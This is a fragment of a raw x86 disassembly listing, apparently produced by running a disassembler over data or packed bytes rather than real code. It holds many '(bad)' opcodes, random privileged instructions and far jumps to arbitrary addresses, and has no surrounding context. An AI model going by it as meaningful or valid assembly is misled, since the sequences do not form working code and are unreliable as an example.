  43de7f:	ror    BYTE PTR [eax-0x7a1d98b0],1
  43de85:	cld    
  43de86:	mov    ecx,0x0
  43de8b:	add    BYTE PTR [edi+0x64],dh
  43de8e:	pop    eax
  43de8f:	imul   edx,edi,0xca4c588a
  43de95:	mov    BYTE PTR [ebp+0x0],dl
  43de98:	jne    0x43de88
  43de9a:	inc    BYTE PTR [eax-0x67]
  43de9d:	cmp    al,0x5f
  43de9f:	pop    edi
  43dea0:	xchg   ecx,eax
  43dea1:	(bad)  
  43dea2:	pop    ecx
  43dea3:	ins    BYTE PTR es:[edi],dx
  43dea4:	mov    cl,BYTE PTR [eax+0x57]
  43dea7:	add    BYTE PTR [ebp-0x8],dh
  43deaa:	pop    es
  43deab:	dec    ebp
  43deac:	nop
  43dead:	push   edi
  43deae:	inc    ecx
  43deaf:	push   0xffffff99
  43deb1:	hlt    
  43deb2:	popa   
  43deb3:	inc    edx
  43deb4:	mov    WORD PTR [edi+0x61],cs
  43deb7:	add    BYTE PTR [ebp+0x4c],dh
  43deba:	or     BYTE PTR [ebp+0x50],cl
  43debd:	test   DWORD PTR [ecx+0x67],0x340c0251
  43dec4:	dec    esp
  43dec5:	sub    ecx,DWORD PTR [ecx]
  43dec7:	pop    eax
  43dec8:	push   esi
  43dec9:	xor    BYTE PTR [esp+ecx*2],ch
  43decc:	jne    0x43ded0
  43dece:	std    
  43decf:	pop    es
  43ded0:	xor    BYTE PTR [edi],ah
  43ded2:	sti    
  43ded3:	inc    ebp
  43ded4:	push   edx
  43ded5:	cs add al,0x38
  43ded8:	sbb    ch,BYTE PTR [edi]
  43deda:	or     al,0x4
  43dedc:	fwait
  43dedd:	add    ah,BYTE PTR [edx]
  43dedf:	sub    DWORD PTR [si-0x30],eax
  43dee3:	pop    edi
  43dee4:	push   ss
  43dee5:	push   esi
  43dee6:	rcr    BYTE PTR [esi+0x16],1
  43dee9:	add    bh,BYTE PTR [ecx]
  43deeb:	add    al,0x31
  43deed:	daa    
  43deee:	mov    ebx,0x66
  43def3:	add    BYTE PTR [eax],al
  43def5:	or     DWORD PTR [edi],esp
  43def7:	test   eax,0x9227095a
  43defc:	add    esp,DWORD PTR [ecx+0x2]
  43deff:	stos   BYTE PTR es:[edi],al
  43df00:	data16 loope 0x43df47
  43df03:	rcr    BYTE PTR [edi-0x2a],0x49
  43df07:	xchg   ecx,eax
  43df08:	gs int3 
  43df0a:	xor    BYTE PTR [edx+eiz*2+0x5d8229c9],cl
  43df11:	mov    edi,DWORD PTR [ecx]
  43df13:	lahf   
  43df14:	(bad)  
  43df15:	iret   
  43df16:	es xchg ebx,eax
  43df18:	data16 jne 0x43df1d
  43df1b:	scas   al,BYTE PTR es:[edi]
  43df1c:	inc    esi
  43df1d:	ret    
  43df1e:	dec    esp
  43df1f:	lods   al,BYTE PTR ds:[esi]
  43df20:	aas    
  43df21:	pop    eax
  43df22:	lock mov eax,0xe72e9167
  43df28:	add    ecx,esp
  43df2a:	add    ah,BYTE PTR [ebx]
  43df2c:	pop    ebx
  43df2d:	mov    al,ds:0xa8584832
  43df32:	sub    bl,BYTE PTR [edi+eiz*2]
  43df35:	nop
  43df36:	das    
  43df37:	dec    eax
  43df38:	gs xchg esi,eax
  43df3a:	push   ebx
  43df3b:	out    0x3,eax
  43df3d:	mov    al,ds:0x52190000
  43df42:	pop    ds
  43df43:	gs sbb al,0x5a
  43df46:	sub    eax,0x1f50086d
  43df4b:	push   ecx
  43df4c:	jmp    0x3d419dc7
  43df51:	daa    
  43df52:	pop    ebx
  43df53:	push   0x1a
  43df55:	push   ebp
  43df56:	pop    ebx
  43df57:	je     0x43df65
  43df59:	add    BYTE PTR [eax],al
  43df5b:	add    BYTE PTR [eax],al
  43df5d:	add    BYTE PTR [edx+0x1f],bh
  43df60:	ins    DWORD PTR es:[edi],dx
  43df61:	cli    
  43df62:	pop    ss
  43df63:	and    DWORD PTR [ebx-0x17],esp
  43df66:	jbe    0x43df86
  43df68:	(bad)  
  43df69:	sbb    eax,DWORD PTR [ecx+eiz*1+0x51]
  43df6d:	enter  0x363f,0x42
  43df71:	into   
  43df72:	and    al,0x47
  43df74:	jae    0x43df3b
  43df76:	and    ah,BYTE PTR [ebx]
  43df78:	jo     0x43df37
  43df7a:	sbb    ecx,DWORD PTR [ecx+0x5e]
  43df7d:	rcl    DWORD PTR [ebx],cl
  43df7f:	pop    ebp
  43df80:	je     0x43df3c
  43df82:	jbe    0x43df69
  43df84:	jmp    FWORD PTR [ecx-0x6291a432]
  43df8a:	shl    DWORD PTR [ecx],0x63
  43df8d:	fwait
  43df8e:	mov    bh,0x2
  43df90:	add    cl,cl
  43df92:	ja     0x43dfd5
  43df94:	arpl   WORD PTR [ebp-0x6591d04b],bx
  43df9a:	mov    eax,ds:0xa596502c
  43df9f:	add    al,BYTE PTR [eax]
  43dfa1:	mov    edx,0x7d634177
  43dfa6:	outs   dx,DWORD PTR ds:[esi]
  43dfa7:	pop    ebp
  43dfa8:	imul   edi,DWORD PTR [edi+0x5f],0x71566228
  43dfaf:	sar    edi,0x24
  43dfb2:	stos   DWORD PTR es:[edi],eax
  43dfb3:	pop    ebx
  43dfb4:	jno    0x43dfd6
  43dfb6:	xchg   edx,eax
  43dfb7:	sub    DWORD PTR [edx-0x17],ebp
  43dfba:	jbe    0x43df44
  43dfbc:	(bad)  
  43dfbd:	dec    DWORD PTR [ebx+0x21]
  43dfc0:	je     0x43e019
  43dfc2:	add    BYTE PTR [eax],al
  43dfc4:	add    BYTE PTR [eax],al
  43dfc6:	add    BYTE PTR [ebp+0x58],al
  43dfc9:	outs   dx,DWORD PTR fs:[esi]
  43dfcb:	stos   DWORD PTR es:[edi],eax
  43dfcc:	push   es
  43dfcd:	jae    0x43dfd1
  43dfcf:	jg     0x43dff2
  43dfd1:	mov    ax,fs:0x7d736b21
  43dfd8:	pop    ds
  43dfd9:	pop    ebp
  43dfda:	push   esp
  43dfdb:	jne    0x43e036
  43dfdd:	pop    ebp
  43dfde:	outs   dx,DWORD PTR ds:[esi]
  43dfdf:	imul   edx,DWORD PTR [edx+0x4f],0x4b040800
  43dfe6:	gs test al,0xef
  43dfe9:	pusha  
  43dfea:	outs   dx,BYTE PTR ds:[esi]
  43dfeb:	js     0x43e044
  43dfed:	outs   dx,DWORD PTR ds:[esi]
  43dfee:	dec    esp
  43dfef:	mov    ds:0x8c575f58,eax
  43dff4:	(bad)  
  43dff5:	pop    esp
  43dff6:	add    cl,dh
  43dff8:	and    DWORD PTR [ebp+eiz*2-0x43],ebp
  43dffc:	push   ebx
  43dffd:	pop    ebp
  43dffe:	inc    esp
  43dfff:	iret   
  43e000:	dec    BYTE PTR [ebp+0x7421cb01]
  43e006:	push   edi
  43e007:	inc    ebp
  43e008:	pop    esp
  43e009:	outs   dx,DWORD PTR fs:[esi]
  43e00b:	sub    esi,edx
  43e00d:	data16 outs dx,BYTE PTR ds:[esi]
  43e00f:	cmp    esi,ebp
  43e011:	(bad)  
  43e012:	jmp    FWORD PTR ds:0xe8653eff
  43e018:	stc    
  43e019:	cmp    al,BYTE PTR [eax]
  43e01b:	xor    BYTE PTR [ecx],al
  43e01d:	dec    edi
  43e01e:	imul   eax,edx,0xa776759
  43e024:	push   eax
  43e025:	ins    DWORD PTR es:[di],dx
  43e027:	or     al,0x5d
  43e029:	popa   
  43e02a:	outs   dx,BYTE PTR ds:[esi]
  43e02b:	add    BYTE PTR [eax],al
  43e02d:	add    BYTE PTR [eax],al
  43e02f:	add    BYTE PTR [eax+0x1e705],ch
  43e035:	pop    ebp
  43e036:	pop    ecx
  43e037:	fs gs pop ebx
  43e03a:	pop    ecx
  43e03b:	addr16 mov ecx,0x75fffff5
  43e041:	es add al,0x41
  43e044:	cwde   
  43e045:	dec    edi
  43e046:	xor    BYTE PTR [ecx-0x7b],ch
  43e049:	sbb    BYTE PTR [ebx+0x6a],bl
  43e04c:	pop    ecx
  43e04d:	dec    eax
  43e04e:	dec    ebp
  43e04f:	add    BYTE PTR [ebp-0xf],dh
  43e052:	add    al,BYTE PTR [ecx+0x58]
  43e055:	out    dx,eax
  43e056:	xor    BYTE PTR [edi+0x66],dh
  43e059:	pop    ss
  43e05a:	pop    edi
  43e05b:	imul   eax,DWORD PTR [eax-0x2],0x4f
  43e05f:	outs   dx,BYTE PTR ds:[esi]
  43e060:	pop    esp
  43e061:	or     al,0x51
  43e063:	add    BYTE PTR [ebp-0x22],dh
  43e066:	add    al,BYTE PTR [ecx+0x50]
  43e069:	mov    bh,0x30
  43e06b:	pop    edi
  43e06c:	es scas eax,DWORD PTR es:[edi]
  43e06e:	cmp    ebp,DWORD PTR [edx+0x25]
  43e071:	mov    dh,0x48
  43e073:	inc    edi
  43e074:	adc    eax,DWORD PTR [ecx]
  43e076:	push   ebp
  43e077:	add    BYTE PTR [ebp-0x21],dh
  43e07a:	add    edi,DWORD PTR ds:0x5352ca1d
  43e080:	add    eax,0x2a6e5fdb
  43e085:	stos   DWORD PTR es:[edi],eax
  43e086:	cld    
  43e087:	jbe    0x43e0fd
  43e089:	push   0xd3c6745f
  43e08e:	pop    edi
  43e08f:	ins    BYTE PTR es:[edi],dx
  43e090:	fstp   DWORD PTR [eax+0x6a5b]
  43e096:	add    BYTE PTR [eax],al
  43e098:	add    cl,bl
  43e09a:	js     0x43e0e9
  43e09c:	add    BYTE PTR [ebp+0x74],dh
  43e09f:	add    cl,BYTE PTR [esi-0x28]
  43e0a2:	sbb    BYTE PTR [ebx+0x6d],0xc1
  43e0a6:	xchg   BYTE PTR [edx+0x3d],dl
  43e0a9:	ror    DWORD PTR [edx-0x544b92af],1
  43e0af:	cld    
  43e0b0:	mov    ds:0x745f6074,eax
  43e0b5:	ret    0x5682
  43e0b8:	fs xchg edx,eax
  43e0ba:	xor    BYTE PTR [ecx],ch
  43e0bc:	push   0x634c02a7
  43e0c1:	cdq    
  43e0c2:	push   edx
  43e0c3:	push   ebp
  43e0c4:	pop    ecx
  43e0c5:	test   al,0x1f
  43e0c7:	push   esi
  43e0c8:	push   ebp
  43e0c9:	mov    edx,0xe403e71e
  43e0ce:	add    DWORD PTR [ebx],ebp
  43e0d0:	pop    edi
  43e0d1:	push   edi
  43e0d2:	inc    eax
  43e0d3:	xor    eax,0x171f5e63
  43e0d8:	push   esi
  43e0d9:	dec    esp
  43e0da:	and    eax,0x1f90412
  43e0df:	sub    ebx,DWORD PTR [edi+0x57]
  43e0e2:	push   ecx
  43e0e3:	adc    BYTE PTR [edx+0x51],bl
  43e0e6:	sub    DWORD PTR [edx],ebx
  43e0e8:	xor    al,0x53
  43e0ea:	sub    DWORD PTR [esi],eax
  43e0ec:	xor    DWORD PTR [ebp+0x2],esi
  43e0ef:	loope  0x43e0f4
  43e0f1:	jo     0x43e116
  43e0f3:	or     ebx,DWORD PTR [eax+0x44]
  43e0f6:	sub    eax,DWORD PTR [ecx]
  43e0f8:	pusha  
  43e0f9:	or     al,0x31
  43e0fb:	pop    ss
  43e0fc:	push   esi
  43e0fd:	add    BYTE PTR [eax],al
  43e0ff:	add    BYTE PTR [eax],al
  43e101:	add    BYTE PTR [eiz*1+0x1a803ba],cl
  43e108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e109:	pop    ecx
  43e10a:	adc    DWORD PTR [edi-0x34],eax
  43e10d:	pop    ecx
  43e10e:	push   es
  43e10f:	add    ch,ah
  43e111:	add    edi,DWORD PTR [eax]
  43e113:	and    edx,ebx
  43e115:	push   edi
  43e116:	les    ebp,FWORD PTR [ecx]
  43e118:	leave  
  43e119:	pop    edi
  43e11a:	fsubr  QWORD PTR [edi]
  43e11c:	xchg   edi,eax
  43e11d:	push   ebp
  43e11e:	int3   
  43e11f:	and    ebp,DWORD PTR [eax-0x49fb26fd]
  43e125:	pop    esi
  43e126:	fistp  WORD PTR [esi]
  43e128:	lods   al,BYTE PTR ds:[esi]
  43e129:	pop    esi
  43e12a:	fdiv   DWORD PTR [ebx]
  43e12c:	mov    BYTE PTR [eax-0x2a],ah
  43e12f:	dec    edi
  43e130:	out    0x3,eax
  43e132:	lock add DWORD PTR [edx+0x764da95e],ebp
  43e139:	pop    esi
  43e13a:	fwait
  43e13b:	inc    edi
  43e13c:	add    BYTE PTR [ebx+0x755d23c0],cl
  43e142:	pop    edi
  43e143:	sub    al,0x62
  43e145:	push   esi
  43e146:	stos   DWORD PTR es:[edi],eax
  43e147:	sub    ebx,DWORD PTR [edi+0x55]
  43e14a:	scas   al,BYTE PTR es:[edi]
  43e14b:	sub    DWORD PTR [edx+0x3e],ebp
  43e14e:	jns    0x43e19c
  43e150:	(bad)  
  43e151:	cmp    bl,BYTE PTR [edx+0x453a6721]
  43e157:	and    ebp,DWORD PTR [esi+0x2a]
  43e15a:	dec    ebp
  43e15b:	push   edi
  43e15c:	ins    DWORD PTR es:[edi],dx
  43e15d:	cmp    ah,BYTE PTR [edx+eax*1+0x4a778300]
  43e164:	addr16 adc eax,0x0
  43e16a:	add    BYTE PTR [esi],ch
  43e16c:	arpl   WORD PTR cs:[edx+ebp*1],bp
  43e170:	sub    al,0x73
  43e172:	and    BYTE PTR ds:0x76e96b23,ah
  43e178:	call   0x254b:0x24522cff
  43e17f:	outs   dx,BYTE PTR ds:[esi]
  43e180:	cmc    
  43e181:	add    BYTE PTR [di],bh
  43e184:	push   ds
  43e185:	push   eax
  43e186:	sti    
  43e187:	cmp    eax,0x76e93f55
  43e18c:	out    dx,eax
  43e18d:	std    
  43e18e:	mov    eax,0xbd74252d
  43e193:	push   ds
  43e194:	sub    BYTE PTR [ebx-0x38],ah
  43e197:	sbb    cl,BYTE PTR [ebx+0x63]
  43e19a:	mov    edx,0xc46157c9
  43e19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e1a0:	add    al,BYTE PTR [eax]
  43e1a2:	pop    ebp
  43e1a3:	jbe    0x43e1e3
  43e1a5:	arpl   di,ax
  43e1a7:	call   0x5d29:0xa8b96126
  43e1ae:	test   al,0x76
  43e1b0:	inc    edi
  43e1b1:	jmp    FWORD PTR [ebp-0x7bb4d15d]
  43e1b7:	pushf  
  43e1b8:	xor    eax,DWORD PTR [edi+0x0]
  43e1bb:	mov    al,0x58
  43e1bd:	gs inc ebx
  43e1bf:	sti    
  43e1c0:	inc    edi
  43e1c1:	data16 je 0x43e1d0
  43e1c4:	add    ebp,eax
  43e1c6:	add    bh,bh
  43e1c8:	push   ecx
  43e1c9:	popa   
  43e1ca:	je     0x43e18b
  43e1cc:	push   esi
  43e1cd:	inc    esp
  43e1ce:	add    BYTE PTR gs:[eax],al
  43e1d1:	add    BYTE PTR [eax],al
  43e1d3:	add    BYTE PTR [edi-0x63908ba5],ch
  43e1d9:	(bad)  
  43e1da:	nop
  43e1db:	add    BYTE PTR [eax+0x21],dl
  43e1de:	pop    esi
  43e1df:	dec    ebp
  43e1e0:	mov    al,ds:0x45683af5
  43e1e5:	pop    edx
  43e1e6:	fs push eax
  43e1e8:	sahf   
  43e1e9:	dec    edi
  43e1ea:	pop    ebx
  43e1eb:	push   edi
  43e1ec:	int3   
  43e1ed:	add    dl,BYTE PTR [ebx+0x5e21a000]
  43e1f3:	push   edi
  43e1f4:	gs push eax
  43e1f6:	outs   dx,DWORD PTR fs:[esi]
  43e1f8:	arpl   si,bp
  43e1fa:	imul   ebp,DWORD PTR [edi+0x6f],0x9200003d
  43e201:	std    
  43e202:	ds mov al,gs:0xa16e5cf9
  43e209:	repz jae 0x43e26d
  43e20c:	mov    al,ds:0x8e000021
  43e211:	std    
  43e212:	ds mov al,gs:0x9f616c43
  43e219:	push   ebx
  43e21a:	inc    esi
  43e21b:	popa   
  43e21c:	mov    ecx,0xc8004f21
  43e221:	add    BYTE PTR [ebx+0x79],cl
  43e224:	das    
  43e225:	inc    esi
  43e226:	pop    ebp
  43e227:	ins    DWORD PTR es:[edi],dx
  43e228:	cld    
  43e229:	push   ds
  43e22a:	push   0x61
  43e22c:	sbb    DWORD PTR [ebx],esp
  43e22e:	je     0x43e295
  43e230:	out    dx,al
  43e231:	push   eax
  43e232:	inc    ecx
  43e233:	outs   dx,BYTE PTR ds:[esi]
  43e234:	repnz dec esp
  43e236:	dec    edi
  43e237:	add    BYTE PTR [eax],al
  43e239:	add    BYTE PTR [eax],al
  43e23b:	add    BYTE PTR [eax],al
  43e23d:	jne    0x43e253
  43e23f:	(bad)  
  43e240:	push   ebx
  43e241:	(bad)  
  43e242:	mov    bl,BYTE PTR [ebp+0x65]
  43e245:	lds    ecx,FWORD PTR [esp+ecx*2+0x5f66a573]
  43e24c:	push   0xffffffa8
  43e24e:	inc    sp
  43e250:	add    BYTE PTR [ebp-0x72],dh
  43e253:	add    eax,DWORD PTR [ecx-0x68]
  43e256:	push   edi
  43e257:	aaa    
  43e258:	arpl   WORD PTR [ebx-0x678bc4b2],bx
  43e25e:	ds arpl WORD PTR cs:[esi+0x774b044f],dx
  43e266:	sbb    DWORD PTR [edi+0x61],ebx
  43e269:	pop    esp
  43e26a:	clc    
  43e26b:	dec    edi
  43e26c:	arpl   WORD PTR [edi-0x18],sp
  43e26f:	push   edi
  43e270:	pop    edi
  43e271:	data16 clc 
  43e273:	ds js  0x43e2a0
  43e276:	stos   DWORD PTR es:[edi],eax
  43e277:	cld    
  43e278:	inc    esp
  43e279:	je     0x43e257
  43e27b:	pop    esi
  43e27c:	je     0x43e2ae
  43e27e:	push   es
  43e27f:	push   edx
  43e280:	jae    0x43e2f7
  43e282:	mov    eax,ds:0xd184afe
  43e287:	dec    edi
  43e288:	inc    edi
  43e289:	and    esi,edi
  43e28b:	push   esi
  43e28c:	inc    edx
  43e28d:	daa    
  43e28e:	cld    
  43e28f:	push   esi
  43e290:	push   eax
  43e291:	or     al,BYTE PTR [edx]
  43e293:	push   edx
  43e294:	je     0x43e30b
  43e296:	adc    edi,esi
  43e298:	dec    eax
  43e299:	add    eax,0x184452be
  43e29e:	fcom   DWORD PTR [ebp+0x74]
  43e2a1:	add    BYTE PTR [eax],al
  43e2a3:	add    BYTE PTR [eax],al
  43e2a5:	add    BYTE PTR [edx],cl
  43e2a7:	fld    TBYTE PTR [ecx]
  43e2a9:	add    BYTE PTR [ebp+0x11],dh
  43e2ac:	dec    BYTE PTR [eax-0x1b]
  43e2af:	mov    esi,0x7bd34752
  43e2b4:	dec    edi
  43e2b5:	je     0x43e268
  43e2b7:	mov    esi,0x2c9654d
  43e2bc:	xchg   edx,eax
  43e2bd:	push   ebx
  43e2be:	jne    0x43e2c2
  43e2c0:	jno    0x43e2c5
  43e2c2:	mov    ecx,0xcb3d891f
  43e2c7:	and    edi,DWORD PTR [eax+eiz*2-0x3b]
  43e2cb:	xor    BYTE PTR [edx+0x54026a62],dl
  43e2d1:	add    edi,DWORD PTR [ecx-0x76c076e1]
  43e2d7:	sbb    eax,0x219c5197
  43e2dc:	cmp    al,BYTE PTR [ebx+eax*4]
  43e2df:	add    esp,DWORD PTR [edx]
  43e2e1:	pop    edi
  43e2e2:	mov    DWORD PTR [ecx+0x5c],edx
  43e2e5:	bound  ebp,QWORD PTR [esi+0x754f391f]
  43e2eb:	add    bl,BYTE PTR [ecx+0x2]
  43e2ee:	cmp    BYTE PTR [edi],bl
  43e2f0:	xor    edi,DWORD PTR [ecx]
  43e2f2:	push   esi
  43e2f3:	cmp    eax,DWORD PTR [ebp+0x55]
  43e2f6:	cmp    dh,BYTE PTR [eax]
  43e2f8:	inc    ebx
  43e2f9:	xor    DWORD PTR [ecx+0x23],ecx
  43e2fc:	sbb    ebx,DWORD PTR [edi+0x75]
  43e2ff:	add    dh,BYTE PTR ds:0x1b1f3403
  43e305:	aaa    
  43e306:	push   esi
  43e307:	and    al,0x14
  43e309:	cmp    eax,DWORD PTR [eax]
  43e30b:	add    BYTE PTR [eax],al
  43e30d:	add    BYTE PTR [eax],al
  43e30f:	sub    DWORD PTR [edi],ebx
  43e311:	adc    al,0x3b
  43e313:	xor    DWORD PTR [edx],eax
  43e315:	add    esi,DWORD PTR gs:[edi+ebx*1]
  43e319:	sti    
  43e31a:	das    
  43e31b:	or     eax,0x19630430
  43e320:	ds int3 
  43e322:	push   eax
  43e323:	adc    BYTE PTR [esi],ch
  43e325:	retf   0x7553
  43e328:	add    al,dh
  43e32a:	add    DWORD PTR [ebx],ebp
  43e32c:	pop    ds
  43e32d:	ret    0xe05a
  43e330:	cs int3 
  43e332:	push   ecx
  43e333:	les    ebp,FWORD PTR [ecx]
  43e335:	leave  
  43e336:	pop    edi
  43e337:	int3   
  43e338:	sub    eax,DWORD PTR [eax]
  43e33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e33b:	mov    ebx,0xb1c86d25
  43e340:	pop    ds
  43e341:	push   ecx
  43e342:	jmp    0xbb4229bd
  43e347:	mov    ds:0xaa9a6721,eax
  43e34c:	pop    ds
  43e34d:	outs   dx,BYTE PTR ds:[esi]
  43e34e:	stos   BYTE PTR es:[edi],al
  43e34f:	retf   0x6d53
  43e352:	jp     0x43e3bf
  43e354:	cmp    bh,BYTE PTR [edi]
  43e356:	jmp    0xac4392d1
  43e35b:	scas   al,BYTE PTR es:[edi]
  43e35c:	sbb    esi,DWORD PTR [esi+edx*4-0x51]
  43e360:	sub    BYTE PTR [esi+edx*2-0x48],ah
  43e364:	and    eax,0xe7796143
  43e369:	std    
  43e36a:	and    eax,0x366a1fa1
  43e36f:	dec    esi
  43e370:	sub    BYTE PTR [esi+edx*2+0x0],ah
  43e374:	add    BYTE PTR [eax],al
  43e376:	add    BYTE PTR [eax],al
  43e378:	cmp    BYTE PTR [ebp+0x74],al
  43e37b:	dec    eax
  43e37c:	inc    ebp
  43e37d:	sbb    ebp,DWORD PTR [ecx+0x47]
  43e380:	mov    BYTE PTR [edx],al
  43e382:	add    BYTE PTR [ebx+0x74],dh
  43e385:	inc    ebp
  43e386:	arpl   WORD PTR ds:0x46e2a85,bx
  43e38c:	push   esi
  43e38d:	push   ds
  43e38e:	inc    esp
  43e38f:	or     al,0x24
  43e391:	sbb    eax,0x246fe74
  43e396:	add    BYTE PTR [ebx],dh
  43e398:	jno    0x43e38f
  43e39a:	imul   ecx,DWORD PTR [esi],0x44
  43e39d:	pop    ds
  43e39e:	inc    esp
  43e39f:	or     al,0x44
  43e3a1:	sbb    eax,0x226fe74
  43e3a6:	add    cl,dl
  43e3a8:	ja     0x43e3eb
  43e3aa:	arpl   bp,dx
  43e3ac:	inc    esi
  43e3ad:	and    al,0x69
  43e3af:	retf   0x251b
  43e3b2:	ins    DWORD PTR es:[edi],dx
  43e3b3:	mov    dh,0xcf
  43e3b5:	sub    BYTE PTR [eax+eax*1+0x43],ah
  43e3b9:	inc    esi
  43e3ba:	dec    ebx
  43e3bb:	je     0x43e3ea
  43e3bd:	inc    ebx
  43e3be:	popa   
  43e3bf:	outs   dx,DWORD PTR ds:[esi]
  43e3c0:	xor    bh,bh
  43e3c2:	outs   dx,DWORD PTR ds:[esi]
  43e3c3:	add    BYTE PTR [edi],bl
  43e3c5:	push   ecx
  43e3c6:	pop    ebp
  43e3c7:	popa   
  43e3c8:	call   0xf2ad3320
  43e3cd:	push   edx
  43e3ce:	addr16 ja 0x43e3d0
  43e3d1:	inc    edx
  43e3d2:	pop    ecx
  43e3d3:	je     0x43e3ca
  43e3d5:	dec    ebp
  43e3d6:	push   di
  43e3d8:	sbb    al,0xff
  43e3da:	inc    ebp
  43e3db:	add    BYTE PTR [eax],al
  43e3dd:	add    BYTE PTR [eax],al
  43e3df:	add    BYTE PTR [eax],al
  43e3e1:	iret   
  43e3e2:	dec    edx
  43e3e3:	addr16 jae 0x43e3cf
  43e3e6:	in     eax,0x60
  43e3e8:	outs   dx,BYTE PTR ds:[esi]
  43e3e9:	clc    
  43e3ea:	dec    ebp
  43e3eb:	outs   dx,DWORD PTR ds:[esi]
  43e3ec:	push   ebx
  43e3ed:	test   al,0xdd
  43e3ef:	jae    0x43e45a
  43e3f1:	mov    bl,0xf0
  43e3f3:	(bad)  
  43e3f4:	push   esi
  43e3f6:	sti    
  43e3f7:	dec    edx
  43e3f8:	gs dec eax
  43e3fa:	dec    esi
  43e3fb:	push   0x6f
  43e3fd:	aas    
  43e3fe:	jmp    0xe5cf576d
  43e403:	gs fs xor esi,edi
  43e407:	dec    edx
  43e408:	je     0x43e447
  43e40a:	cli    
  43e40b:	pusha  
  43e40c:	outs   dx,DWORD PTR ds:[esi]
  43e40d:	(bad)  
  43e40e:	(bad)  
  43e40f:	push   ebp
  43e410:	add    BYTE PTR [edi+0x58615cec],cl
  43e416:	jmp    0xe3d3495e
  43e41b:	jae    0x43e48c
  43e41d:	lods   al,BYTE PTR ds:[esi]
  43e41e:	push   edi
  43e41f:	add    BYTE PTR [eax],al
  43e421:	push   edi
  43e422:	std    
  43e423:	ds gs cwde 
  43e426:	push   ecx
  43e427:	pop    ebp
  43e428:	jae    0x43e3b9
  43e42a:	fstp   QWORD PTR [esi+0x65]
  43e42d:	int3   
  43e42e:	out    dx,eax
  43e42f:	push   0x0
  43e431:	mov    eax,0x756549fc
  43e436:	mov    ebp,0xc6e65f27
  43e43b:	inc    ecx
  43e43c:	pop    edi
  43e43d:	in     eax,0x6f
  43e43f:	aaa    
  43e440:	outs   dx,BYTE PTR ds:[esi]
  43e441:	fcomp  DWORD PTR [ebx+0x2dfc]
  43e447:	add    BYTE PTR [eax],al
  43e449:	add    BYTE PTR [edi-0x75],dh
  43e44c:	daa    
  43e44d:	arpl   si,bx
  43e44f:	mov    fs,WORD PTR [edi]
  43e451:	ins    DWORD PTR es:[edi],dx
  43e452:	(bad)  
  43e453:	jp     0x43e47a
  43e455:	arpl   WORD PTR [ebx+ebx*4+0x60741dfc],si
  43e45c:	daa    
  43e45d:	je     0x43e418
  43e45f:	pop    esp
  43e460:	inc    edi
  43e461:	js     0x43e4d8
  43e463:	rol    DWORD PTR [ebx],1
  43e465:	inc    ecx
  43e466:	cwde   
  43e467:	aaa    
  43e468:	inc    edx
  43e469:	ins    BYTE PTR es:[edi],dx
  43e46a:	mov    WORD PTR [ebx],gs
  43e46c:	and    ebp,DWORD PTR [ecx-0x6c]
  43e46f:	sub    eax,0x4f944421
  43e474:	and    eax,DWORD PTR [eax]
  43e476:	jne    0x43e4ad
  43e478:	add    ecx,DWORD PTR [ebp-0x70]
  43e47b:	dec    edi
  43e47c:	inc    ecx
  43e47d:	jae    0x43e4e6
  43e47f:	dec    esp
  43e480:	sub    eax,0x3158456e
  43e485:	add    BYTE PTR [ebp-0x4d],dh
  43e488:	add    eax,DWORD PTR [ecx+0x50]
  43e48b:	out    dx,eax
  43e48c:	inc    eax
  43e48d:	pop    edi
  43e48e:	inc    ebp
  43e48f:	div    DWORD PTR [esi]
  43e491:	outs   dx,BYTE PTR ds:[esi]
  43e492:	push   eax
  43e493:	fwait
  43e494:	cld    
  43e495:	xor    BYTE PTR [eax+ebp*8+0x26],0x74
  43e49a:	and    BYTE PTR [ebx],cl
  43e49c:	sub    BYTE PTR [edi+0x29],bl
  43e49f:	push   es
  43e4a0:	push   edx
  43e4a1:	arpl   WORD PTR [esi],dx
  43e4a3:	scas   eax,DWORD PTR es:[edi]
  43e4a4:	cld    
  43e4a5:	or     DWORD PTR [ebp-0x23],esi
  43e4a8:	es popa 
  43e4aa:	or     al,0x9
  43e4ac:	push   esp
  43e4ad:	pop    edi
  43e4ae:	add    BYTE PTR [eax],al
  43e4b0:	add    BYTE PTR [eax],al
  43e4b2:	add    BYTE PTR [ecx+esi*4],bl
  43e4b5:	xor    BYTE PTR [eax],al
  43e4b7:	jne    0x43e4bb
  43e4b9:	addr16 add eax,0x46d32730
  43e4bf:	sbb    dh,BYTE PTR [edx]
  43e4c1:	fstp   TBYTE PTR [eax]
  43e4c3:	jecxz  0x43e4ec
  43e4c5:	out    0x3,eax
  43e4c7:	sti    
  43e4c8:	add    ch,BYTE PTR [edx-0x2fa616d8]
  43e4ce:	xor    ecx,edx
  43e4d0:	and    DWORD PTR [edx-0x73fd6fb9],edi
  43e4d6:	add    al,0xb4
  43e4d8:	daa    
  43e4d9:	fwait
  43e4da:	push   eax
  43e4db:	(bad)  
  43e4dc:	xor    eax,0x27d42496
  43e4e1:	mov    edx,0xa202fd03
  43e4e6:	sub    BYTE PTR [ecx-0x3dd888a9],ah
  43e4ec:	test   BYTE PTR ss:[ebp-0x6c],dl
  43e4f0:	and    bh,ah
  43e4f2:	add    ebp,DWORD PTR [edx-0x7ed75dfd]
  43e4f8:	aas    
  43e4f9:	dec    esp
  43e4fa:	xor    eax,0x27422390
  43e4ff:	cmp    al,BYTE PTR [edx]
  43e501:	mov    bl,0x4
  43e503:	and    BYTE PTR ss:[ebx+0x54],al
  43e507:	dec    edx
  43e508:	sbb    edx,DWORD PTR [ecx+0x38]
  43e50b:	jne    0x43e50f
  43e50d:	or     DWORD PTR [eax+ebx*4],eax
  43e510:	sbb    cl,BYTE PTR [eax+0x36]
  43e513:	inc    ecx
  43e514:	and    DWORD PTR [edx],esi
  43e516:	daa    
  43e517:	add    BYTE PTR [eax],al
  43e519:	add    BYTE PTR [eax],al
  43e51b:	add    BYTE PTR [ebx+0x59],bl
  43e51e:	out    0x3,eax
  43e520:	jge    0x43e524
  43e522:	es sub al,0x1a
  43e525:	xor    al,0x3b
  43e527:	xor    DWORD PTR [edi+eiz*1],edi
  43e52a:	cld    
  43e52b:	pop    eax
  43e52c:	jne    0x43e530
  43e52e:	fwait
  43e52f:	add    edi,DWORD PTR [edx]
  43e531:	xor    eax,0x36382715
  43e536:	add    BYTE PTR [edx+eiz*2],ch
  43e539:	xor    dh,BYTE PTR [eax+esi*8+0x76]
  43e53d:	or     esi,edi
  43e53f:	mov    bl,0x57
